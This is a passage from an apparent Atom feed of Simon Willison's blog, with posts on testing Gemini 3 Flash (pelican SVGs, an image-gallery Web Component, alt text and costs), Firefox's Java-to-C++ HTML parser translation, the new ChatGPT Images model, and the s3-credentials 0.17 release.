&lt;pre&gt;&lt;code&gt;llm -m gemini-3-flash-preview --thinking-level minimal "Generate an SVG of a pelican riding a bicycle"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here are four pelicans, for thinking levels &lt;a href="https://gist.github.com/simonw/8047c805a4a1df7fd4e854b18e7482d9"&gt;minimal&lt;/a&gt;, &lt;a href="https://gist.github.com/simonw/fb61686a1f915e3777b4a40e2df41068"&gt;low&lt;/a&gt;, &lt;a href="https://gist.github.com/simonw/190c3ce82cd8976827139bbc4dcc2d19"&gt;medium&lt;/a&gt;, and &lt;a href="https://gist.github.com/simonw/da66ffce135359161996e41e50e32ec3"&gt;high&lt;/a&gt;:&lt;/p&gt;
&lt;image-gallery width="4"&gt;
    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg" alt="A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background." /&gt;
    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg" alt="Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background." /&gt;
    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg" alt="A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background." /&gt;
    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg" alt="Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background." /&gt;
&lt;/image-gallery&gt;
&lt;h4 id="i-built-the-gallery-component-with-gemini-3-flash"&gt;I built the gallery component with Gemini 3 Flash&lt;/h4&gt;
&lt;p&gt;The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:&lt;/p&gt;
&lt;div class="highlight highlight-text-html-basic"&gt;&lt;pre&gt;&lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;image-gallery&lt;/span&gt; &lt;span class="pl-c1"&gt;width&lt;/span&gt;="&lt;span class="pl-s"&gt;4&lt;/span&gt;"&lt;span class="pl-kos"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="pl-kos"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="pl-ent"&gt;image-gallery&lt;/span&gt;&lt;span class="pl-kos"&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gemini-3-flash-preview --system &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;You write alt text for any image pasted in by the user. Alt text is always presented in a&lt;/span&gt;
&lt;span class="pl-s"&gt;fenced code block to make it easy to copy and paste out. It is always presented on a single&lt;/span&gt;
&lt;span class="pl-s"&gt;line so it can be used easily in Markdown images. All text on the image (for screenshots etc)&lt;/span&gt;
&lt;span class="pl-s"&gt;must be exactly included. A short note describing the nature of the image itself should go first.&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; \
-a https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can see the code that powers the image gallery Web Component &lt;a href="https://github.com/simonw/simonwillisonblog/blob/31651b3a527011d1c971d4256c1c9f61ef378d23/static/image-gallery.js"&gt;here on GitHub&lt;/a&gt;. I built it by prompting Gemini 3 Flash via &lt;a href="https://llm.datasette.io/"&gt;LLM&lt;/a&gt; like this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gemini-3-flash-preview &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;Build a Web Component that implements a simple image gallery. Usage is like this:&lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;&amp;lt;image-gallery width="5"&amp;gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;  &amp;lt;img src="image1.jpg" alt="Image 1"&amp;gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;  &amp;lt;img src="image2.jpg" alt="Image 2" data-thumb="image2-thumb.jpg"&amp;gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;  &amp;lt;img src="image3.jpg" alt="Image 3"&amp;gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;&amp;lt;/image-gallery&amp;gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;If an image has a data-thumb= attribute that one is used instead, other images are scaled down. &lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;The image gallery always takes up 100% of available width. The width="5" attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.&lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It took a few follow-up prompts using &lt;code&gt;llm -c&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;Use a real modal such that keyboard shortcuts and accessibility features work without extra JS&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;

llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;Use X for the close icon and make it a bit more subtle&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;

llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;remove the hover effect entirely&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;

llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;I want no border on the close icon even when it is focused&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here's &lt;a href="https://gist.github.com/simonw/09f63a49f29620d4cbbfd383cfee1db3"&gt;the full transcript&lt;/a&gt;, exported using &lt;code&gt;llm logs -cue&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Those five prompts took:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;225 input, 3,269 output&lt;/li&gt;
&lt;li&gt;2,243 input, 2,908 output&lt;/li&gt;
&lt;li&gt;4,319 input, 2,516 output&lt;/li&gt;
&lt;li&gt;6,376 input, 2,094 output&lt;/li&gt;
&lt;li&gt;8,151 input, 1,806 output&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Added together that's 21,314 input and 12,593 output for a grand total &lt;a href="https://www.llm-prices.com/#it=21314&amp;amp;ot=12593&amp;amp;sel=gemini-3-flash-preview"&gt;of 4.8436 cents&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The guide to &lt;a href="https://ai.google.dev/gemini-api/docs/gemini-3#migrating_from_gemini_25"&gt;migrating from Gemini 2.5&lt;/a&gt; reveals one disappointment:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Image segmentation:&lt;/strong&gt; Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or &lt;a href="https://ai.google.dev/gemini-api/docs/robotics-overview"&gt;Gemini Robotics-ER 1.5&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I &lt;a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/"&gt;wrote about this capability in Gemini 2.5&lt;/a&gt; back in April. I hope they come back in future models - they're a really neat capability that is unique to Gemini.&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/google"&gt;google&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/web-components"&gt;web-components&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gemini"&gt;gemini&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-pricing"&gt;llm-pricing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="google"/><category term="ai"/><category term="web-components"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="gemini"/><category term="llm-pricing"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/></entry><entry><title>firefox parser/html/java/README.txt</title><link href="https://simonwillison.net/2025/Dec/17/firefox-parser/#atom-everything" rel="alternate"/><published>2025-12-17T01:48:54+00:00</published><updated>2025-12-17T01:48:54+00:00</updated><id>https://simonwillison.net/2025/Dec/17/firefox-parser/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/mozilla-firefox/firefox/tree/main/parser/html/java"&gt;firefox parser/html/java/README.txt&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
TIL (or TIR - &lt;a href="https://simonwillison.net/2009/Jul/11/john/"&gt;Today I was Reminded&lt;/a&gt;) that the HTML5 Parser used by Firefox is maintained as Java code (&lt;a href="https://github.com/mozilla-firefox/firefox/commits/main/parser/html/javasrc"&gt;commit history here&lt;/a&gt;) and converted to C++ using a custom translation script.&lt;/p&gt;
&lt;p&gt;You can see that in action by checking out the ~8GB Firefox repository and running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd parser/html/java
make sync
make translate
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here's &lt;a href="http://gistpreview.github.io/?e53ff836cb44816670adddc3a518b3cc"&gt;a terminal session where I did that&lt;/a&gt;, including the output of &lt;code&gt;git diff&lt;/code&gt; showing the updated C++ files.&lt;/p&gt;
&lt;p&gt;I did some digging and found that the code that does the translation work lives, weirdly, in the &lt;a href="https://github.com/validator/validator"&gt;Nu Html Checker&lt;/a&gt; repository on GitHub which powers the W3C's &lt;a href="https://validator.w3.org/nu/"&gt;validator.w3.org/nu/&lt;/a&gt; validation service!&lt;/p&gt;
&lt;p&gt;Here's a snippet from &lt;a href="https://github.com/validator/validator/blob/dfd1948624259c63027bc5953e89bdeee81fb7b0/htmlparser/translator-src/nu/validator/htmlparser/cpptranslate/CppVisitor.java#L421-L442"&gt;htmlparser/cpptranslate/CppVisitor.java&lt;/a&gt; showing how a class declaration is converted into C++:&lt;/p&gt;
&lt;pre&gt;    &lt;span class="pl-k"&gt;protected&lt;/span&gt; &lt;span class="pl-smi"&gt;void&lt;/span&gt; &lt;span class="pl-en"&gt;startClassDeclaration&lt;/span&gt;() {
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#define "&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;className&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;"_cpp__"&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();

        &lt;span class="pl-k"&gt;for&lt;/span&gt; (&lt;span class="pl-smi"&gt;int&lt;/span&gt; &lt;span class="pl-s1"&gt;i&lt;/span&gt; = &lt;span class="pl-c1"&gt;0&lt;/span&gt;; &lt;span class="pl-s1"&gt;i&lt;/span&gt; &amp;lt; &lt;span class="pl-smi"&gt;Main&lt;/span&gt;.&lt;span class="pl-c1"&gt;H_LIST&lt;/span&gt;.&lt;span class="pl-s1"&gt;length&lt;/span&gt;; &lt;span class="pl-s1"&gt;i&lt;/span&gt;++) {
            &lt;span class="pl-smi"&gt;String&lt;/span&gt; &lt;span class="pl-s1"&gt;klazz&lt;/span&gt; = &lt;span class="pl-smi"&gt;Main&lt;/span&gt;.&lt;span class="pl-c1"&gt;H_LIST&lt;/span&gt;[&lt;span class="pl-s1"&gt;i&lt;/span&gt;];
            &lt;span class="pl-k"&gt;if&lt;/span&gt; (!&lt;span class="pl-s1"&gt;klazz&lt;/span&gt;.&lt;span class="pl-en"&gt;equals&lt;/span&gt;(&lt;span class="pl-s1"&gt;javaClassName&lt;/span&gt;)) {
                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#include &lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;cppTypes&lt;/span&gt;.&lt;span class="pl-en"&gt;classPrefix&lt;/span&gt;());
                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;klazz&lt;/span&gt;);
                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;".h&lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
            }
        }

        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#include &lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;className&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;".h&lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();
    }&lt;/pre&gt;

&lt;p&gt;Here's a &lt;a href="https://johnresig.com/blog/html-5-parsing/"&gt;fascinating blog post&lt;/a&gt; from John Resig explaining how validator author Henri Sivonen introduced the new parser into Firefox in 2009.

    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46295771#46296888"&gt;Hacker News conversation&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/c-plus-plus"&gt;c-plus-plus&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/firefox2"&gt;firefox2&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/henri-sivonen"&gt;henri-sivonen&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/java"&gt;java&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/john-resig"&gt;john-resig&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/mozilla"&gt;mozilla&lt;/a&gt;&lt;/p&gt;



</summary><category term="c-plus-plus"/><category term="firefox2"/><category term="henri-sivonen"/><category term="java"/><category term="john-resig"/><category term="mozilla"/></entry><entry><title>The new ChatGPT Images is here</title><link href="https://simonwillison.net/2025/Dec/16/new-chatgpt-images/#atom-everything" rel="alternate"/><published>2025-12-16T23:59:22+00:00</published><updated>2025-12-16T23:59:22+00:00</updated><id>https://simonwillison.net/2025/Dec/16/new-chatgpt-images/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://openai.com/index/new-chatgpt-images-is-here/"&gt;The new ChatGPT Images is here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
OpenAI shipped an update to their ChatGPT Images feature - the feature that &lt;a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/"&gt;gained them 100 million new users&lt;/a&gt; in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro &lt;a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/"&gt;in November&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The focus for the new ChatGPT Images is speed and instruction following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It makes precise edits while keeping details intact, and generates images up to 4x faster&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It's also a little cheaper: OpenAI say that the new &lt;a href="https://platform.openai.com/docs/models/gpt-image-1.5"&gt;gpt-image-1.5&lt;/a&gt; API model makes image input and output "20% cheaper in GPT Image 1.5 as compared to GPT Image 1". &lt;/p&gt;
&lt;p&gt;I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Add two kakapos inspecting the pots&lt;/p&gt;
&lt;p&gt;&lt;img alt="Outdoor craft market booth displaying handmade ceramics and jewelry on a navy tablecloth with &amp;quot;NATBAT CREATIONS CALIFORNIA USA&amp;quot; logo. Items include colorful glazed ceramic cups in blue, orange, and black; decorative bowls including a rainbow-striped piece; jewelry pendants and earrings on wooden display stands; ceramic plant markers in various colors labeled &amp;quot;Artichoke&amp;quot;, &amp;quot;Cilantro&amp;quot;, &amp;quot;Chili&amp;quot;, &amp;quot;Oregano&amp;quot;, &amp;quot;Potato&amp;quot;, &amp;quot;Pumpkin&amp;quot;, &amp;quot;Sage&amp;quot;." src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Here's the result from the new ChatGPT Images model:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Same craft market booth as previous image, now with two large olive-green Kākāpō parrots perched on the table among the ceramics, one investigating the blue glazed cups and the other examining an orange cup." src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;And here's what I got from Nano Banana Pro:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Same craft market booth with two Kākāpō now in different positions: one remains center-table peering into the ceramic cups near the rainbow pot, while the second has moved to the right edge of the table near the plant markers, appearing to examine or possibly chew on items at the table's corner. They are both a little smaller than in the first image." src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.&lt;/p&gt;
&lt;p&gt;I was a little less impressed by the result I got for an infographic from the prompt "Infographic explaining how the Datasette open source project works" followed by "Run some extensive searches and gather a bunch of relevant information and then try again" (&lt;a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc"&gt;transcript&lt;/a&gt;):&lt;/p&gt;
&lt;p&gt;&lt;img alt="Infographic titled &amp;quot;HOW DATASETTE WORKS&amp;quot; with subtitle &amp;quot;THE OPEN SOURCE DATA PLATFORM&amp;quot; showing a four-step workflow. STEP 1 (orange): &amp;quot;LOAD YOUR DATA&amp;quot; - &amp;quot;CSV, JSON, XLSX, SQLite, PostgreSQL, etc.&amp;quot; with icons of file types flowing into a laptop. Below: &amp;quot;IMPORT DATASETS - Turn your structured data into SQLite databases and .db files.&amp;quot; with checkmarks for &amp;quot;Datasette Desktop App for local deployment&amp;quot;, &amp;quot;CLI tool for command-line imports&amp;quot;, &amp;quot;Automatic CSV import tool&amp;quot;. STEP 2 (green): &amp;quot;PUBLISH &amp;amp; DEPLOY&amp;quot; - &amp;quot;HOST DATASETS ONLINE&amp;quot; with cloud and server icons labeled &amp;quot;DEPLOY&amp;quot;. Below: &amp;quot;SHARE ONLINE - Deploy your Datasette instance to a public server.&amp;quot; with checkmarks for &amp;quot;Datasette Cloud - Free hosting service&amp;quot;, &amp;quot;Deploy anywhere via plugins&amp;quot;, &amp;quot;Configurable API tools&amp;quot;. STEP 3 (purple): &amp;quot;EXPLORE &amp;amp; QUERY&amp;quot; - &amp;quot;BROWSE, SEARCH &amp;amp; VISUALIZE&amp;quot; with database and browser window icons. Below: &amp;quot;SQL QUERIES &amp;amp; SEARCH - Browse, filter, search, and visualize your data with an interactive web interface.&amp;quot; with checkmarks for &amp;quot;Perform SQL queries directly from the browser&amp;quot;, &amp;quot;Filter, sort, and facet data&amp;quot;, &amp;quot;Generate custom visualizations and charts&amp;quot;. STEP 4 (red): &amp;quot;BUILD &amp;amp; EXTEND&amp;quot; - &amp;quot;PLUGINS, APIS &amp;amp; INTEGRATIONS&amp;quot; with gear and wrench icons labeled &amp;quot;API&amp;quot;. Below: &amp;quot;CUSTOMIZE &amp;amp; DEVELOP&amp;quot; with bullets &amp;quot;Develop custom plugins for added functionality&amp;quot;, &amp;quot;Access JSON API for programmatic queries&amp;quot;, &amp;quot;Embed and integrate Datasette into other applications&amp;quot;. Bottom banner shows four features: &amp;quot;OPEN DATA PLATFORM - Widely used for visualizing, sharing and building applications with SQLite backed data&amp;quot;, &amp;quot;EXTENSIBLE PLUGINS - 100+ plugins available, inc uding chaps, charts authentication, and more&amp;quot;, &amp;quot;ACCESS CONTROL - Granular permissions for controlling who s an access and interact with your data&amp;quot;, &amp;quot;OPEN SOURCE PROJECT - Actively developed open source project with a vibrant community of contributors&amp;quot;." src="https://static.simonwillison.net/static/2025/chatgpt-infographic.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;See &lt;a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/#creating-an-infographic"&gt;my Nano Banana Pro post&lt;/a&gt; for comparison.&lt;/p&gt;
&lt;p&gt;Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kakapo"&gt;kakapo&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/text-to-image"&gt;text-to-image&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nano-banana"&gt;nano-banana&lt;/a&gt;&lt;/p&gt;



</summary><category term="ai"/><category term="kakapo"/><category term="openai"/><category term="generative-ai"/><category term="text-to-image"/><category term="nano-banana"/></entry><entry><title>s3-credentials 0.17</title><link href="https://simonwillison.net/2025/Dec/16/s3-credentials/#atom-everything" rel="alternate"/><published>2025-12-16T23:40:31+00:00</published><updated>2025-12-16T23:40:31+00:00</updated><id>https://simonwillison.net/2025/Dec/16/s3-credentials/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/simonw/s3-credentials/releases/tag/0.17"&gt;s3-credentials 0.17&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
New release of my &lt;a href="https://s3-credentials.readthedocs.io/"&gt;s3-credentials&lt;/a&gt; CLI tool for managing credentials needed to access just one S3 bucket. Here are the release notes in full:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;New commands &lt;code&gt;get-bucket-policy&lt;/code&gt; and &lt;code&gt;set-bucket-policy&lt;/code&gt;. &lt;a href="https://github.com/simonw/s3-credentials/issues/91"&gt;#91&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;New commands &lt;code&gt;get-public-access-block&lt;/code&gt; and &lt;code&gt;set-public-access-block&lt;/code&gt;. &lt;a href="https://github.com/simonw/s3-credentials/issues/92"&gt;#92&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;New &lt;code&gt;localserver&lt;/code&gt; command for starting a web server that makes time limited credentials accessible via a JSON API. &lt;a href="https://github.com/simonw/s3-credentials/pull/93"&gt;#93&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;That &lt;code&gt;s3-credentials localserver&lt;/code&gt; command (&lt;a href="https://s3-credentials.readthedocs.io/en/stable/localserver.html"&gt;documented here&lt;/a&gt;) is a little obscure, but I found myself wanting something like that to help me test out a new feature I'm building to help create temporary Litestream credentials using Amazon STS.&lt;/p&gt;
&lt;p&gt;Most of that new feature was &lt;a href="https://gistpreview.github.io/?500add71f397874ebadb8e04e8a33b53"&gt;built by Claude Code&lt;/a&gt; from the following starting prompt:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Add a feature s3-credentials localserver which starts a localhost weberver running (using the Python standard library stuff) on port 8094 by default but -p/--port can set a different port and otherwise takes an option that names a bucket and then takes the same options for read--write/read-only etc as other commands. It also takes a required --refresh-interval option which can be set as 5m or 10h or 30s. All this thing does is reply on / to a GET request with the IAM expiring credentials that allow access to that bucket with that policy for that specified amount of time. It caches internally the credentials it generates and will return the exact same data up until they expire (it also tracks expected expiry time) after which it will generate new credentials (avoiding dog pile effects if multiple requests ask at the same time) and return and cache those instead.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/aws"&gt;aws&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3"&gt;s3&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/annotated-release-notes"&gt;annotated-release-notes&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3-credentials"&gt;s3-credentials&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-engineering"&gt;prompt-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;&lt;/p&gt;



